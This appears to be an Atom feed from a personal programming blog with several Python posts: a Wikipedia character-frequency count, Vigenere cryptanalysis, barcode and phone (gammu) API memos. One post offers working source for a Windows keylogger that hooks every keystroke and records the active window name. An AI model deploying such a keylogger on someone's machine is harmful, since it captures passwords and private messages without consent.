<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Piece of Code | Robin David]]></title>
  <link href="http://www.robindavid.fr/blog/categories/piece-of-code/atom.xml" rel="self"/>
  <link href="http://www.robindavid.fr/"/>
  <updated>2014-03-02T11:00:09+00:00</updated>
  <id>http://www.robindavid.fr/</id>
  <author>
    <name><![CDATA[Robin David]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Wikipedia frequency analysis]]></title>
    <link href="http://www.robindavid.fr/blog/2012/06/16/wikipedia-frequency-analysis/"/>
    <updated>2012-06-16T00:00:00+00:00</updated>
    <id>http://www.robindavid.fr/blog/2012/06/16/wikipedia-frequency-analysis</id>
    <content type="html"><![CDATA[<h2>Introduction</h2>

<p>The wish to do a frequency analysis of wikipedia came from the lack of a good frequency table for french character that included every characters(space, tab, LF etc).
In order to do it I needed a strong base, and I knew it was possible to download the entire content of Wikipedia that&rsquo;s why I have decided to take it as basis.</p>

<p>Dumps can be downloaded on <a href="http://dumps.wikimedia.org/frwiki/latest/">wikimedia</a>. The one I took for this test is the release of the 18th of February 2012 and weigh uncompressed 12.5 GB.</p>

<p>The code used is quite simple, the only thing I had to deal with was the xml and the wiki syntax. Indeed I wanted only articles content and not all xml tags which would have disguised results.</p>

<p>Thats why I filtered only the text contained into '&lt;text xml:space=&ldquo;preserve&rdquo;&gt;&lsquo; and &rsquo;&lt;/text&gt;&lsquo; which are the two markers for the begin and the end of an article. Moreover within an article I do some clean up that&rsquo;s why I remove all Wiki syntax tags(in a dirty way) otherwise it would also disguise results (and &rsquo;[&lsquo; would be for instance well ranked whereas it should not).</p>

<p><em>Note: I have written this script in python 3 that support unicode crucial here.</em></p>

<h2>Script</h2>

<p>``` python Frequency analysis script <a href="https://github.com/RobinDavid/Python-programs/blob/master/wikipedia_frequency_analysis/wiki-analysis.py">https://github.com/RobinDavid/Python-programs/blob/master/wikipedia_frequency_analysis/wiki-analysis.py</a></p>

<h1>!/usr/bin/python3.2</h1>

<p>import re
import sys
import time</p>

<h1>&mdash;&mdash;&mdash;&mdash;&mdash; GLOBAL VARS &mdash;&mdash;&mdash;&ndash;</h1>

<p>lines=0
articles=0</p>

<h1>characters=0</h1>

<p>f = open(sys.argv[1],&ldquo;r&rdquo;)
article = &ldquo;&rdquo;</p>

<p>begin_text = re.compile(&lsquo;<text xml:space="preserve">&rsquo;)
end_text = re.compile(&lsquo;</text>&rsquo;)
within_article = False
dictionnary = {}</p>

<p>left_brackets = re.compile(&ldquo;[[&rdquo;)
right_brackets = re.compile(&ldquo;]]&rdquo;)
colon_brackets = re.compile(&ldquo;[[\S<em>:.</em>]]\n&rdquo;)
curly_brackets = re.compile(&ldquo;\n?&rdquo;)</p>

<h1>&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;</h1>

<p>def print_temp_stats():</p>

<pre><code>print("Lines: " + str(lines),end="\r")
</code></pre>

<p>def clean_line(l):
  line = l
  line = re.sub(colon_brackets,&lsquo;&rsquo;,line)
  line = re.sub(left_brackets,&lsquo;&rsquo;,line)
  line = re.sub(right_brackets,&lsquo;&rsquo;,line)
  line = re.sub(curly_brackets,&lsquo;&rsquo;,line)
  return line</p>

<p>def processArticle(s):
  #global characters
  for elt in s:</p>

<pre><code>try:
  dictionnary[elt] += 1
except KeyError: #Faster in execution than doing if dictionnary.get(elt) because triggered once for each new characters but after far faster..
  dictionnary[elt] = 1
</code></pre>

<p>def write_final():
  print()
  name = &ldquo;RESULT-&rdquo;+sys.argv[1]+&ldquo;.txt&rdquo;
  fout = open(name,&ldquo;w&rdquo;)
  l = sorted(dictionnary.items(),key=lambda x: x[1], reverse=True)
  for elt in l:</p>

<pre><code>e = elt[0]
if e == " ":
  e = "[SPACE]"
elif e == "\n":
  e = "[LF]"
elif e == "\t":
  e = "[HTAB]"
elif e == "\r":
  e = "[CR]"
s = e + ": " + str(elt[1])
fout.write(s+"\n")
</code></pre>

<p>  fout.close()
  print(&ldquo;Results in: &rdquo;+name)</p>

<p>def print_final_stats():
  chars = 0
  for v in dictionnary.values():</p>

<pre><code>chars += v
</code></pre>

<p>  print(&ldquo;Articles: &rdquo;+ str(articles) + &ldquo;\tLines: &rdquo; + str(lines) + &ldquo;\tNumber characters: &rdquo;+str(chars)+&ldquo;\tDifferent characters: &rdquo;+ str(len(dictionnary)))</p>

<p>if <strong>name</strong> == &ldquo;<strong>main</strong>&rdquo;:</p>

<p>  if len(sys.argv) &lt;= 1:</p>

<pre><code>print("Usage: wiki-analysis.py wikipedia-filename")
sys.exit(1)
</code></pre>

<p>  tdeb = time.time()</p>

<p>  while 1:</p>

<pre><code>  line = f.readline()
  if line == "":
      break;
  lines += 1

  if not within_article:
      if re.search(begin_text,line):
          within_article = True
          articles += 1
          article += clean_line(re.sub(begin_text,"",line))
  else: #already in an article
      if re.search(end_text,line):
          within_article = False
          processArticle(article)
          article = ""
      else:
          article += clean_line(line)

  print_temp_stats()
</code></pre>

<p>  tfin=time.time()</p>

<p>  print(&ldquo;\nExecution time: &rdquo;+str(tfin-tdeb) + &ldquo; secondes&rdquo;)
  print_final_stats()
  write_final()
  sys.exit(0)
```</p>

<h2>Results</h2>

<p>The execution of my script took aproximately 3 hours and the output is:
``` python
bash$ ./wiki-analysis.py frwiki-latest-pages-meta-current.xml
Lines: 222669441
Execution time: 10033.887793064117 secondes                                                                                <br/>
Articles: 3714740       Lines: 222669441        Number characters: 9217905119   Different characters: 27605</p>

<p>Results in: RESULT-frwiki-latest-pages-meta-current.xml.txt
```</p>

<p>You can download the output file with the complete table <a href="https://github.com/RobinDavid/Python-programs/blob/master/wikipedia_frequency_analysis/RESULT-frwiki-latest-pages-meta-current.xml.txt">here</a>.</p>

<p><strong>As we could have supposed the space comes in first position with 1329412224 times, followed by &ldquo;e&rdquo; and &ldquo;t&rdquo;. The LF comes in 16th position. As we can see it took almost 3 hours which is quite long for data process (even though it is 12 GB).</strong></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Kasiski-Babbage cryptanalysis in Python]]></title>
    <link href="http://www.robindavid.fr/blog/2012/06/15/kasiski-babbage-cryptanalysis-in-python/"/>
    <updated>2012-06-15T00:00:00+00:00</updated>
    <id>http://www.robindavid.fr/blog/2012/06/15/kasiski-babbage-cryptanalysis-in-python</id>
    <content type="html"><![CDATA[<p>This article will show you how to decrypt text ciphered with Vigenere algorithm wihtout knowing neither the key neither the key length.</p>

<h2> Principle</h2>

<p>The Kasiski-Babbagge method is based on the fact that once we have found the key length found the clear text is reduced to find the clear text of a ceaser ciphered text (which is really easy).</p>

<p>Another principle of the method is that 3 or more characters at two different position in the ciphered text are most likely to have been ciphered with the same 3 or more characters of the key. Based on this fact the distance between the two suite of characters is very likely to be a multiple of the key length. Example:</p>

<p><img class="center" src="/images/matrix.png" title="&lsquo;matrix&rsquo;" ></p>

<p>As we can see on the picture above there is 3 patterns with a respective distance of 70, 40 and 10. So we can easily suppose that the key length is a multiple of the three distance. In this case the greatest multiple is 10, we can suppose that key is 10 characters long.</p>

<p>In this case we just have to split the text in 10, every ten characters to create 10 samples in which the frequency of characters can be analysed like in caesar.</p>

<h2>Code !</h2>

<p>The input file used for this example can be downloaded <a href="%20/downloads/kasiski-input.txt" title="">here</a></p>

<p>The following use various helping functions showed in <a href="">useful-basic-function-python</a></p>

<p>Now the key part of the cryptanalysis is to develop the algorithm to find all the tuples  throughout the text calculate theirs distance and the divisors of it.
So the firt function to write is a function that calculate all the divisors of a value. The function below do the job and for the given integer return a list of all the divisors.
``` python Get all the divisors of a given number
def getDivisors(n):</p>

<pre><code>l = []
for i in range(2,n):
    if n % i == 0:
        l.append(i)
return l
</code></pre>

<p>```</p>

<p>Now let&rsquo;s move to the core function that find all the tuples. This function return two values that are the number of tuples found and a dirty list of the divisors of all tuples. (You will see later how it will be used).
``` python Find identical patterns in list (size > 3)</p>

<h1>l argument should be a list containing all bytes of the file (read with toList)</h1>

<p>def getTuples(l):</p>

<pre><code>res = {}
freq =[]
count = 0
i = 0
while i &lt; len(l): # Loop through all the list
    elt= l[i:i+3] # Take at least 3-character length for tuples
    long = len(elt)
    if long == 3: #should be 3 if not means we are at the end of the list
        for j in range(i+1,len(l)): #Find further in the list for the same pattern
            if l[i:i+long] == l[j:j+long]: #If match the 3-char check for more
                while l[i:i+long] == l[j:j+long]:
                    long = long + 1
                long = long -1
                elt = l[i:i+long] # Now we have a tuple 
                diff = j - i # Compute the distance
                freq.extend(getDivisors(diff)) #Add the divisors to the list 
                print ("%s\ti:%s\tj:%s\tdiff:%s\t\tDivisors:%s" % (elt,i,j, diff,getDivisors(diff))) #Print information about the tuple (can be deleted)
                count = count +1
                j = j + long + 1
        i = i + long -3 +1
    else:
        i = i + 1
return count, freq
</code></pre>

<p>```</p>

<p>The next step is to make the count each divisors and sort them in descending order. The following function return a list sorted containing a tupe of the divisor number and the number of hits.
``` python
def countOcc(l): # return list with (decimal_char, occ)</p>

<pre><code>d={}
for elt in l:
    if d.has_key(elt):
        d[elt] += 1
    else:
        d[elt] = 1
return sorted(d.items(),key=lambda x: x[1], reverse=True)
</code></pre>

<p>```</p>

<p>The list returned by this function is:
<strong>[(2, 143), (5, 142), (10, 138), (4, 72), (20, 69), (6, 42), (3, 42), (15, 41), (8, 39), (30, 39), (40, 36), (7, 29), (14, 29), (35, 29), (25, 28), (50, 24), (70, 24), (12, 20), (60, 20)]</strong></p>

<p>In this example we can see that 2 is a divisor for 138 tuple etc. But there is also 5 and 10 that are close and 4 is far behind. Moreover 2 and 5 are also divisors of 10 so this is obvious that the key is 10 characters long.</p>

<p>Now that we &ldquo;know&rdquo; the key length we just have to split the ciphered list into 10 sub-lists modulo 10. The function below return take in argument the key length and the original list and return a dictionnary that use the position as key (ex: 1 to 10) and all the sub-lists as items.</p>

<p>``` python Split file in sublist of 10 chars
def explode(key,li):</p>

<pre><code>dic = {}
for e in range(1,key+1):
    dic[e] = [] 
i = 0
for index in range(len(li)):
    if i == key:
        i = 0
    dic[i+1].append(li[index])
    i = i + 1
return dic
</code></pre>

<p>```</p>

<p>The next step is the second delicate step. Indeed we need to find the shift for each sub-list. To find it we can do a frequency analysis considering the space as the most frequent character like it used to be in english. So what we will do here is do a frequency analysis for each sub-list. For each sub-list we consider the most frequent character as a space and then apply the associated shift to all character. And then we recreate the original list with all decipher sub-list and then recreate the text. Once it&rsquo;s done we can easily identify if for one of the sub-list the space was not the most frequent and then we can try with the second most frequent and so on.
The first function we need to acomplish this task is a function that decipher a list with a given shift:
``` python
def decipher(l,diff):</p>

<pre><code>newl = list()
for e in l:
    val = e - diff
    if val &lt; 0:
        newl.append(256 + (val % -256))
    else:
        newl.append(val)
return newl
</code></pre>

<p>```</p>

<p>Now we need a function that do the reverse of the explode function. So this function takes back the dictionnary returned by explode and recreate the list.
``` python
def recreate(dic):</p>

<pre><code>i = 0
output = []
try:
    while 1:
        for l in dic.values():
            output.append(l[i])
        i = i + 1
except:
    pass
return output
</code></pre>

<p>```</p>

<p>To finish the following piece of code explode the original list, makes a frequency analysis decipher all the sub-list, then recreate the list and end up by reconverting every decimal character into character in order to print the result.
``` python final code to trigger the all
res = explode(10, l) #We consider in this exemple a key length of 10 and l the original list
for i in range(1,10+1): #For each sub-list</p>

<pre><code>occ = countOcc(res[i]) #Make a frequency analysis
shift = (occ[0][0] - 32) % 256 # Consider the most frequent element of being a space(32 in decimal)
print ("Frequency analysis for the index: %s\tshift:%s\n%s\n" % (i,shift,occ)) #Print informations (can be deleted)
res[i] = decipher(res[i],shift) #Try do decipher using a classical ceaser function and the determined shift
</code></pre>

<p>final = recreate(res) #Once we have processed all sub-list recreate a list with all the sub-lists.
print &lsquo;&rsquo;.join([chr(x) for x in final]) #Print the result
```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[pydmtx Memo]]></title>
    <link href="http://www.robindavid.fr/blog/2012/04/23/pydmtx-memo/"/>
    <updated>2012-04-23T00:00:00+00:00</updated>
    <id>http://www.robindavid.fr/blog/2012/04/23/pydmtx-memo</id>
    <content type="html"><![CDATA[<p>pydmtx is a module that allow to decode and encode 2 Dimentional barcodes also known as Data Matrix barcodes(or just matrix barcode).</p>

<p>Note: pydmtx does not work for the matrix barcode system developped by google for Android (which can be recognized by the 3 black squares, in the corners of the barcode).</p>

<p>The module is articulated around the PIL python module for image processing, but as we will see youcan easily convert it to OpenCV image for instance.</p>

<h2>Decoding using PIL</h2>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>Decoding matrix using PIL </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">pydmtx</span> <span class="kn">import</span> <span class="n">DataMatrix</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">img</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="c">#Take the picture in argument but can come from anywhere else</span>
</span><span class='line'><span class="k">if</span> <span class="n">img</span><span class="o">.</span><span class="n">mode</span> <span class="o">!=</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">RGB</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;:</span> <span class="c">#Not absolutely needed because images are used to be in RGB.</span>
</span><span class='line'><span class="n">img</span> <span class="o">=</span> <span class="n">img</span><span class="o">.</span><span class="n">convert</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">RGB</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">dm</span> <span class="o">=</span> <span class="n">DataMatrix</span><span class="p">()</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">message</span> <span class="o">=</span> <span class="n">dm</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">img</span><span class="o">.</span><span class="n">size</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">img</span><span class="o">.</span><span class="n">size</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nb">buffer</span><span class="p">(</span><span class="n">img</span><span class="o">.</span><span class="n">tostring</span><span class="p">()))</span>
</span><span class='line'><span class="k">print</span> <span class="n">message</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<h2>Decoding using OpenCV</h2>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>Decoding using OpenCV </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">pydmtx</span> <span class="kn">import</span> <span class="n">DataMatrix</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">cv2.cv</span> <span class="kn">as</span> <span class="nn">cv</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">img</span> <span class="o">=</span> <span class="n">cv</span><span class="o">.</span><span class="n">LoadImage</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">You</span> <span class="n">can</span> <span class="n">also</span> <span class="n">convert</span> <span class="n">it</span><span class="p">,</span> <span class="k">if</span> <span class="n">it</span> <span class="ow">is</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">RGB</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">dm</span> <span class="o">=</span> <span class="n">DataMatrix</span><span class="p">()</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">message</span> <span class="o">=</span> <span class="n">dm</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">img</span><span class="o">.</span><span class="n">width</span><span class="p">,</span> <span class="n">img</span><span class="o">.</span><span class="n">height</span><span class="p">,</span> <span class="n">img</span><span class="o">.</span><span class="n">tostring</span><span class="p">())</span> <span class="c">#As you can see doesn&amp;rsquo;t matter the kind of image used, because decode take an image formated in string</span>
</span><span class='line'><span class="k">print</span> <span class="n">message</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<h2>Encoding using PIL</h2>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>Encoding using PIL </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">pydmtx</span> <span class="kn">import</span> <span class="n">DataMatrix</span>
</span><span class='line'><span class="n">dm</span> <span class="o">=</span> <span class="n">DataMatrix</span><span class="p">()</span>
</span><span class='line'><span class="n">dm</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Hello</span> <span class="n">World</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span>
</span><span class='line'><span class="n">im</span> <span class="o">=</span> <span class="n">dm</span><span class="o">.</span><span class="n">image</span> <span class="c">#Return the image in PIL format</span>
</span><span class='line'><span class="n">dm</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">helloworld</span><span class="o">.</span><span class="n">jpg</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">jpeg</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span> <span class="c">#But you can directly save it to a file</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<h2>Encoding using OpenCV</h2>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>Encoding using OpenCV </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kn">from</span> <span class="nn">pydmtx</span> <span class="kn">import</span> <span class="n">DataMatrix</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">cv2.cv</span> <span class="kn">as</span> <span class="nn">cv</span>
</span><span class='line'><span class="n">dm</span> <span class="o">=</span> <span class="n">DataMatrix</span><span class="p">()</span>
</span><span class='line'><span class="n">dm</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Hello</span> <span class="n">World</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span>
</span><span class='line'><span class="n">im</span> <span class="o">=</span> <span class="n">dm</span><span class="o">.</span><span class="n">image</span> <span class="c">#Retrieve the image in PIL format</span>
</span><span class='line'><span class="n">cv_im</span> <span class="o">=</span> <span class="n">cv</span><span class="o">.</span><span class="n">CreateImageHeader</span><span class="p">(</span><span class="n">im</span><span class="o">.</span><span class="n">size</span><span class="p">,</span> <span class="n">cv</span><span class="o">.</span><span class="n">IPL_DEPTH_8U</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span> <span class="c">#Create the new image</span>
</span><span class='line'><span class="n">cv</span><span class="o">.</span><span class="n">SetData</span><span class="p">(</span><span class="n">cv_im</span><span class="p">,</span> <span class="n">im</span><span class="o">.</span><span class="n">tostring</span><span class="p">())</span> <span class="c"># Fill it with the pil image content&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Then</span> <span class="n">you</span> <span class="n">have</span> <span class="n">an</span> <span class="n">OpenCV</span> <span class="n">image</span> <span class="n">contained</span> <span class="ow">in</span> <span class="n">cv_im</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">cv</span><span class="o">.</span><span class="n">ShowImage</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Image</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span><span class="n">cv_im</span><span class="p">)</span>
</span><span class='line'><span class="n">cv</span><span class="o">.</span><span class="n">WaitKey</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Smart Keylogger in Python (for Windows)]]></title>
    <link href="http://www.robindavid.fr/blog/2012/02/01/smart-keylogger-in-python-for-windows/"/>
    <updated>2012-02-01T00:00:00+00:00</updated>
    <id>http://www.robindavid.fr/blog/2012/02/01/smart-keylogger-in-python-for-windows</id>
    <content type="html"><![CDATA[<p>Since I have discovered the pyHook module for Windows, I keeped in mind the idea to do a keylogger. I finally found the time to do it and I will show what I have done which is as small as efficient.</p>

<p>The mechanism is quite easy, pyHook once launched grab all input events, and you need aside something to grab this hooked events. So there is two way to grab them, the first use pygame and make and infinite loop on the pygame.event.pump() method, the second use the pythoncom module and call pythoncom.PumpMessages() which do itself an infinite loop waiting for events.</p>

<p>The code of the keylogger is :</p>

<p>[cc lang=&ldquo;python&rdquo; line_numbers=&ldquo;true&rdquo;]
import pyHook
import pygame # or import pythoncom
import sys</p>

<p>class Keylogger():</p>

<pre><code>def __init__(self):
    self.windowname = None
    self.hm = pyHook.HookManager()
    self.hm.KeyDown = self.OnKeyboardEvent
    self.hm.HookKeyboard()

def run(self):# initialize pygame and start the game loop
    pygame.init()
    while True:
        pygame.event.pump()
    #or pythoncom.PumpMessages()

def OnKeyboardEvent(self, event):
    if event.WindowName != self.windowname:
        self.windowname = event.WindowName
        print ("\n\nWindow: [%s]" % self.windowname)
    if (event.Ascii &gt; 31 and event.Ascii &lt; 127) or event.Ascii == 13 or event.Ascii == 9:
        sys.stdout.write(chr(event.Ascii))
</code></pre>

<p>if <strong>name</strong> == &ldquo;<strong>main</strong>&rdquo;:</p>

<pre><code>k = Keylogger()
k.run()
</code></pre>

<p>[/cc]</p>

<p>&nbsp;</p>

<p>For a given event, availables attributes are :</p>

<p>[cc lang=&ldquo;python&rdquo;]</p>

<p>&lsquo;MessageName:&rsquo;,event.MessageName
&lsquo;Message:&rsquo;,event.Message
&lsquo;Time:&rsquo;,event.Time
&lsquo;Window:&rsquo;,event.Window
&lsquo;WindowName:&rsquo;,event.WindowName
&lsquo;Ascii:&rsquo;, event.Ascii, chr(event.Ascii)
&lsquo;Key:&rsquo;, event.Key
&lsquo;KeyID:&rsquo;, event.KeyID
&lsquo;ScanCode:&rsquo;, event.ScanCode
&lsquo;Extended:&rsquo;, event.Extended
&lsquo;Injected:&rsquo;, event.Injected
&lsquo;Alt&rsquo;, event.Alt
&lsquo;Transition&rsquo;, event.Transition</p>

<p>[/cc]</p>

<p>Sources for this project are available on <a href="https://github.com/RobinDavid/Python-programs/tree/master/keylogger">github</a>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[python-gammu Memo]]></title>
    <link href="http://www.robindavid.fr/blog/2012/02/01/python-gammu-memo/"/>
    <updated>2012-02-01T00:00:00+00:00</updated>
    <id>http://www.robindavid.fr/blog/2012/02/01/python-gammu-memo</id>
    <content type="html"><![CDATA[<ul>
    <li>Import gammu module
<strong>import gammu</strong></li>
</ul>


<p>&nbsp;</p>

<ul>
    <li>Initiate connection to the phone using default file configuration "~/.gammurc"
<strong>sm = gammu.StateMachine()</strong>
<strong>sm.ReadConfig()</strong>
<strong>sm.Init()</strong></li>
</ul>


<p>&nbsp;</p>

<ul>
    <li>Send SMS
[cc lang="python"]message = {
'Text': 'python-gammu testing message',
'SMSC': {'Location': 1},
'Number': '+420800123465',
}
sm.SendSMS(message)
[/cc]</li>
</ul>


<p>&nbsp;</p>

<ul>
    <li>Give a call to the given phone number
<strong>sm.DialVoice(phone_number)</strong></li>&nbsp;
    <li>Main Exception from which all others exceptions heritate.
<strong>except gammu.GSMError:</strong>
<span style="color: #0000ff;">Note: To check all others exceptions</span> <a title="wammu exception" href="http://wammu.eu/docs/manual/python/exceptions.html" target="_blank">wammu.eu</a></li>
    <span style="color: #ff0000;">Important: Every methods can throw various exception, be careful to catch them at least with GSMError</span>
</ul>


<p>&nbsp;</p>

<ul>
    <li>Get Netowrk informations
<strong>sm.GetNetworkInfo()</strong></li>
</ul>


<p>&nbsp;</p>

<ul>
    <li>Get infos</li>
<ul>
    <li><strong>sm.GetManufacturer()</strong></li>
    <li><strong>sm.GetModel()</strong></li>
    <li><strong>sm.GetFirmware()</strong></li>
    <li><strong>sm.GetIMEI()</strong></li>
    <li><strong>sm.GetOriginalIMEI()</strong></li>
    <li><strong>sm.GetProductCode()</strong></li>
    <li><strong>sm.GetSIMIMSI()</strong></li>
    <li><strong>sm.GetSMSC()</strong></li>
    <li><strong>sm.GetHardware()</strong></li>
    <li><strong>sm.GetManufacturerMonth()</strong></li>
    <li><strong>sm.GetPPM()</strong> #language packs in the phone</li>
</ul>&nbsp;
    <li>SMS infos</li>
<ul>
    <li><strong>sm.GetSMSStatus()</strong> #Return number of SMS read/unread etc..</li>
    <li><strong>sm.GetSMSFolders()</strong> # Return folders as hash with attributes</li>
</ul>&nbsp;
    <li>Read SMS
<strong>sms = sm.GetNextSMS(Start = True, Folder=0)</strong></li>
    and then
<strong>sms = sm.GetNextSMS(Location = sms['Location'], Folder=0)</strong>
    <span style="color: #0000ff;">Note: To get a specific sms</span>
<strong>sms = sm.GetSMS(Location = loc, Folder = 0)</strong>&nbsp;&nbsp;
    &nbsp;<li>Example: Loop through SMS:[cc lang="python"]
def printSMS():
    start = True
    while 1:
        try :
            if start:
                sms = sm.GetNextSMS(Start = True, Folder=0)
                start = False
            else:sms = sm.GetSMS(Location = loc, Folder = 0)
                sms = sm.GetNextSMS(Location = sms[0]['Location'], Folder=0)#be careful sometimes Location is directly in the hash so you'll have to remove the [0]
        except gammu.ERR_EMPTY:
            break
        print "Location:%s\t State:%s\t Folder:%s\t Text:%s" % (sms[0]['Location'],sms[0]['State'],sms[0]['Folder'],sms[0]['Text'])[/cc]</li>&nbsp;
    <li>Get contacts informations from PhoneBook
<strong>phoneBookStatus = sm.GetMemoryStatus(Type = 'ME')</strong> # from mobile memory
<span style="color: #0000ff;">Note: Availables types : 'ME', 'SM', 'ON', 'DC', 'RC', 'MC', 'MT', 'FD', 'VM'</span></li>&nbsp;
    <li>Loop through contacts of phonebook
<strong>contact = sm.GetNextMemory(Start=True,Type='ME')</strong> #mobile phone
<strong>contact = sm.GetNextMemory(Location = contact['Location'],Type='ME')</strong>
..
<span style="color: #0000ff;"> Note: Be carefull to catch gammu.ERR_TIMEOUT instead of EMPTY</span></li>&nbsp;
    <li>TODO lists
Status: <strong>sm.GetToDoStatus()</strong>
First element: <strong>todo = sm.GetNextToDo(Start = True)</strong>
All the others: <strong>sm.GetNextToDo(Location = todo['Location'])</strong>A specific element: <strong>sm.GetTodo(location)</strong></li>&nbsp;
    <li>Calendar
Status: <strong>sm.GetCalendarStatus()</strong>
